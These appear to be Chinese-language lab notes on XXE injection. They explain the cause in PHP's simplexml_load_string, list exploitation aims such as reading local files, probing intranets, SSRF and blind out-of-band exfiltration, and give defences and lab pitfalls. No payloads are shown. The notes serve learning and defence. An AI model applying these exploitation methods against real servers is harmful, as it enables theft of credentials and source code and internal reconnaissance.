XXE漏洞 超详细实验笔记

一、漏洞原理（通俗靶场版）

XXE（XML External Entity）XML外部实体注入漏洞。
Web业务接收用户可控的XML数据，后端使用XML解析器直接解析，且未关闭外部实体解析功能。攻击者通过自定义ENTITY外部实体，调用file、http等协议，读取服务器本地文件、探测内网接口，造成敏感信息泄露。

核心一句话：可控XML数据 + 开启外部实体解析 = 任意文件读取/内网探测

二、漏洞产生核心原因

  1. 后端直接接收用户可控XML参数，未做过滤与净化
  2. 使用 simplexml_load_string 等默认支持外部实体的解析函数
  3. 未调用 libxml 关闭外部实体加载
  4. 允许用户自定义 DOCTYPE、ENTITY 实体声明

实验

  1. 观察后端代码,从前端获取数据，然后丢给simplexml_load_string： 代码中也存在正常的xml： 复制后提交到前段输入框，前端将hacker的值在前端输出。

漏洞利用方式

  1. 文件读取：读取配置文件、源码、密钥、密码文件
  2. 内网探测：扫描内网IP、端口、存活主机
  3. SSRF攻击：对内网服务器发起HTTP请求
  4. 盲XXE外带：无回显场景带出数据

漏洞危害

  1. 泄露服务器本地任意敏感文件内容
  2. 探测内网架构，为内网渗透做铺垫
  3. 读取数据库账号密码、后台密钥、网站源码
  4. 配合其他漏洞可进一步提升权限、拿下服务器权限

防御方案

  1. 彻底关闭XML外部实体解析（最有效）
  1. 禁止用户输入 DOCTYPE、ENTITY 等实体定义标签
  2. 优先使用 JSON 数据传输，避免使用XML
  3. 对XML内容做白名单校验，仅允许合法业务标签
  4. 使用高安全等级的XML解析库，禁用远程资源加载

实验踩坑记录

  1. PHP8.0以上默认关闭外部实体，靶场实验建议使用PHP5/7版本
  2. XML语法严格，符号错误、缺少闭合都会直接解析失败
  3. Windows路径必须使用正斜杠 /，反斜杠会报错
  4. 无回显XXE无法直接读取文件，需要配合DNSlog外带
  5. 仅XML接口存在XXE，JSON接口完全不受影响

漏洞对比总结

  1. SQL注入：操作数据库，窃取数据
  2. RCE：执行系统命令，权限最大
  3. 文件包含：加载服务器文件执行代码
  4. XXE：利用XML解析漏洞读取文件、探测内网
